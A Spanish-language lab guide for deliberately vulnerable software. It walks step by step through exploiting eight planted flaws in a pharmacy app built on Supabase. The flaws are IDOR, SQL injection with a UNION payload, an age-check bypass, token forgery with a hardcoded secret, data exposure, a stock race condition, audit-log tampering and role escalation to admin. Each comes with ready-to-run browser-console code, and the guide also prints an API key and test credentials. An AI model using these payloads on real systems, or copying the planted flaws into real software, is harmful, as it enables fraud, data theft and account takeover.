# 🧪 Guía de explotación — 8 errores de seguridad (Farmacia Luci)

Esta guía te lleva **paso a paso** por cada uno de los 8 errores.
Cada error tiene: **PASO 1** (entrar/preparar) y **PASO 2** (ejecutar y ver el fallo).

---

## ⚙️ ANTES DE EMPEZAR (obligatorio)

### Requisito A — Aplicar el SQL de activación

Ve a **https://supabase.com** → inicia sesión → proyecto **`uiedqhteoduvtnluvmbs`** →
menú izquierdo **SQL Editor** → **New query** → pega TODO el SQL del archivo
`supabase/ACTIVAR-LOS-8.md` → botón **Run**.

Debe responder `Success. No rows returned`.

> Esto activa los errores **1, 2, 7 y 8** (políticas y función).
> El error **5 ya está activo** y el 6 se completa con el Requisito B.

### Requisito B — Desplegar las Edge Functions

Abre una terminal en la carpeta del proyecto (`framacia`) y ejecuta:

```bash
npx supabase login
npx supabase link --project-ref uiedqhteoduvtnluvmbs
npx supabase functions deploy verify-age
npx supabase functions deploy confirm-order
```

> Esto activa el error **4** (verify-age) y completa el **6** (confirm-order).

### Requisito C — Datos que usarás en todos los pasos

- **URL del proyecto:** `https://uiedqhteoduvtnluvmbs.supabase.co`
- **Anon key (pública):** `sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU`
- **Cuentas de prueba:**
  - admin → `admin@gmail.com` / `admin123`
  - cajero → `cajero@gmail.com` / `cajero123`
  - inventario → `inventario@gmail.com` / `inventario123`
- **App:** abre en el navegador `http://localhost:8081`

> **Dónde sacas la anon key tú mismo (Demostración de "inspeccionar la página"):**
> F12 → pestaña **Network** → recarga la página → haz clic en cualquier petición a
> `uiedqhteoduvtnluvmbs.supabase.co` → pestaña **Headers** → en *Request Headers* verás
> `apikey: sb_publishable_...`. Esa clave permite leer la API sin cuenta.

---

# 🔴 ERROR 1 — IDOR: modificar pedidos de otros clientes

**Qué es:** la política de `orders` permite actualizar pedidos sin comprobar que sean tuyos.

### PASO 1 — Obtener un pedido de otro cliente de la BD
1. F12 → **Console**.
2. Pega esto y pulsa Enter:
```js
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/orders?select=id,customer_id,status', {
  headers: { apikey: 'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU',
             Authorization: 'Bearer ' + JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token')))).access_token }
}).then(r=>r.json()).then(console.log)
```
3. Anota un `id` que **NO** sea tuyo.

### PASO 2 — Modificar ese pedido ajeno
```js
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/orders?id=eq.EL_ID_DEL_OTRO&select=id,status', {
  method: 'PATCH',
  headers: { apikey: 'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU',
             Authorization: 'Bearer ' + JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token')))).access_token,
             'Content-Type': 'application/json',
             Prefer: 'return=representation' },
  body: JSON.stringify({ status: 'cancelled' })
}).then(r=>r.json()).then(console.log)
```
✅ **FALLO confirmado si:** la respuesta es un array con el pedido y su `status: "cancelled"` (cambió un pedido que no es tuyo).

---

# 🔴 ERROR 2 — SQL Injection en la búsqueda de productos

**Qué es:** el buscador del catálogo llama a `search_products_vulnerable`, que concatena el texto del usuario dentro del SQL.

### PASO 1 — Encontrar dónde se usa (inspección de código)
1. En la web, ve a **Catálogo** (`/(store)/catalog`) y escribe `Paracetamol` en el buscador.
2. F12 → **Network** → verás la petición `.../rpc/search_products_vulnerable`.
3. F12 → **Sources** → `Ctrl+Shift+F` → busca `search_products_vulnerable`
   → aparece en el bundle y en `app/(store)/catalog.tsx`.

### PASO 2 — Inyectar SQL
En F12 → **Console**:
```js
// 2a) Inyección simple: devuelve TODOS los productos aunque no coincidan
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/rpc/search_products_vulnerable', {
  method: 'POST',
  headers: { apikey: 'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU', 'Content-Type': 'application/json' },
  body: JSON.stringify({ query_param: "' OR 1=1 --" })
}).then(r=>r.json()).then(d=>console.log('filas:', d.length))
```
✅ **FALLO confirmado si:** `filas:` es mayor que 0 (el `OR 1=1` ignoró el filtro).

**Prueba avanzada (leer otra tabla):**
```js
body: JSON.stringify({ query_param: "%' UNION SELECT null,null,null,null,(SELECT string_agg(email,'|') FROM profiles),null,null,null,null,null -- " })
```

---

# 🔴 ERROR 3 — Bypass de verificación de edad

**Qué es:** el checkout confía en una variable del navegador (`ageVerified`); el servidor no revalida.

### PASO 1 — Marcar la bandera falsa desde la consola
1. En la web, agrega al carrito un producto **+18** (ej. *Alcohol 70° 500ml*).
2. Ve al **Checkout**.
3. F12 → **Console** → ejecuta:
```js
const c = JSON.parse(localStorage.getItem('farmacia-luci-cart'));
c.state.ageVerified = true;
localStorage.setItem('farmacia-luci-cart', JSON.stringify(c));
console.log('ageVerified =', JSON.parse(localStorage.getItem('farmacia-luci-cart')).state.ageVerified);
```

### PASO 2 — Comprar sin DNI
4. Recarga la página (F5).
5. Completa el checkout **sin escribir DNI**.
✅ **FALLO confirmado si:** el pedido se registra igual (`¡Pedido registrado!`) sin verificación de edad.

---

# 🔴 ERROR 4 — Secret débil en la firma de verificación (verify-age)

**Qué es:** la Edge Function firma el token con una clave fija `secret123` escrita en el código.

### PASO 1 — Descubrir el secret (inspección de código)
1. Abre `supabase/functions/verify-age/index.ts` → busca `VERIFY_SECRET`.
2. Verás: `const VERIFY_SECRET = 'secret123';`

### PASO 2 — Ver el token firmado que devuelve el servidor
1. F12 → **Network** → haz una verificación (verifica un DNI en el checkout).
2. Clic en la petición `.../functions/v1/verify-age` → **Response** → verás un campo `token`.
3. El token es `verification_id + "." + SHA256(verification_id + 'secret123')`.
4. F12 → **Console** para reproducir la firma con el secret público:
```js
async function forgeToken(id) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(id + 'secret123'));
  const hex = [...new Uint8Array(buf)].map(b=>b.toString(16).padStart(2,'0')).join('');
  return id + '.' + hex;
}
forgeToken('CUALQUIER-ID').then(console.log);
```
✅ **FALLO confirmado si:** con el secret `secret123` puedes generar un token válido → la verificación es forjable.

---

# 🔴 ERROR 5 — Precio de costo expuesto (cost_price)  ⚡ YA ACTIVO

**Qué es:** la API devuelve el campo `cost_price` (margen de ganancia) sin pedir sesión.

### PASO 1 — Ver que el dato viaja al navegador
1. F12 → **Network** → en el catálogo busca la petición `.../rest/v1/products?...`.
2. Copia esa URL.

### PASO 2 — Extraer el dato directamente
En F12 → **Console** (funciona SIN login):
```js
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/products?select=name,price,cost_price&limit=5', {
  headers: { apikey: 'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU' }
}).then(r=>r.json()).then(d=>console.table(d))
```
✅ **FALLO confirmado si:** aparece la columna **`cost_price`** (ej. `1.8`, `2.5`) además del precio de venta.

---

# 🔴 ERROR 6 — Race condition: sobreventa de stock

**Qué es:** `confirm-order` lee el stock y luego lo escribe en dos pasos separados (sin transacción ni bloqueo).

### PASO 1 — Dejar un producto en stock bajo
1. Inicia sesión como **inventario** (`inventario@gmail.com` / `inventario123`).
2. Ve a **Stock** y ajusta un producto (ej. *Paracetamol*) a **stock = 1**.
3. Cierra sesión e inicia como **cliente** (o crea uno desde la tienda).

### PASO 2 — Lanzar 2 compras simultáneas del último ítem
1. Agrega ese producto al carrito (cantidad 1) y ve al checkout.
2. F12 → **Console** → dispara dos pedidos a la vez:
```js
const tok = JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token')))).access_token;
const body = { items:[{ product_id:'7eca3829-caff-4884-849d-d4e008232103', quantity:1 }],
               delivery_type:'delivery', delivery_address:{street:'Av. Prueba 123'},
               payment_method:'yape', age_verification_id:null };
const req = () => fetch('https://uiedqhteoduvtnluvmbs.supabase.co/functions/v1/confirm-order', {
  method:'POST',
  headers:{ apikey:'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU',
            Authorization:'Bearer '+tok, 'Content-Type':'application/json' },
  body: JSON.stringify(body)
}).then(r=>r.json());
Promise.all([req(), req()]).then(console.log)
```
3. Revisa el stock: en el catálogo verás que vendiste 2 unidades teniendo 1.
✅ **FALLO confirmado si:** los 2 pedidos se aceptan con stock = 1 (sobreventa), porque ambos pasaron
el chequeo antes de que ninguno descontara.

---

# 🔴 ERROR 7 — Alteración de logs de auditoría (age_verifications)

**Qué es:** puedes cambiar el resultado de tu propia verificación de `rejected` a `approved`.

### PASO 1 — Localizar tu registro de verificación
1. Inicia sesión como **cliente** y verifica un DNI (o haz una compra de un producto +18).
2. F12 → **Console**:
```js
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/age_verifications?select=id,result,verified_by', {
  headers: { apikey:'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU',
             Authorization:'Bearer '+JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token')))).access_token }
}).then(r=>r.json()).then(console.log)
```
3. Anota el `id` de tu registro.

### PASO 2 — Falsificar el resultado
```js
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/age_verifications?id=eq.TU_ID&select=id,result', {
  method:'PATCH',
  headers:{ apikey:'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU',
            Authorization:'Bearer '+JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token')))).access_token,
            'Content-Type':'application/json', Prefer:'return=representation' },
  body: JSON.stringify({ result:'approved', age_calculated: 25 })
}).then(r=>r.json()).then(console.log)
```
✅ **FALLO confirmado si:** la respuesta muestra `"result":"approved"` (alteraste tu propio log).

---

# 🔴 ERROR 8 — Escalada de privilegios (volverse admin)

**Qué es:** puedes cambiar tu propio `role` a `admin` desde la API.

### PASO 1 — Obtener tu ID de usuario
1. Inicia sesión como **cliente** (no admin).
2. F12 → **Console**:
```js
const u = JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token'))));
console.log('mi id:', u.user.id, 'email:', u.user.email);
```
3. Anota tu `id`.

### PASO 2 — Subirte a admin
```js
const u = JSON.parse(localStorage.getItem(Object.keys(localStorage).find(k=>k.includes('auth-token'))));
fetch('https://uiedqhteoduvtnluvmbs.supabase.co/rest/v1/profiles?id=eq.'+u.user.id+'&select=id,role', {
  method:'PATCH',
  headers:{ apikey:'sb_publishable_I9Ju1D_a6CaUtgCsckjAXQ_4f6_j9JU',
            Authorization:'Bearer '+u.access_token,
            'Content-Type':'application/json', Prefer:'return=representation' },
  body: JSON.stringify({ role:'admin' })
}).then(r=>r.json()).then(console.log)
```
4. Recarga la app (F5).
✅ **FALLO confirmado si:** la respuesta muestra `"role":"admin"` **y** al recargar aparece el
**Panel de administración**.

---

# 📊 Tabla resumen

| # | Error | ¿Necesita SQL? | ¿Necesita deploy? |
|---|-------|:--------------:|:----------------:|
| 1 | IDOR pedidos | ✅ | — |
| 2 | SQL Injection | ✅ | — |
| 3 | Bypass verificación edad | — | ✅ confirm-order |
| 4 | Secret débil | — | ✅ verify-age |
| 5 | cost_price expuesto | — (ya activo) | — |
| 6 | Race condition stock | — | ✅ confirm-order |
| 7 | Alteración de logs | ✅ | — |
| 8 | Escalada de privilegios | ✅ | — |

**Total:** SQL aplica 1, 2, 7 y 8. Deploy aplica 3, 4 y 6. El 5 ya funciona.
Con los dos Requisitos (A y B) quedan los **8 explotables**.
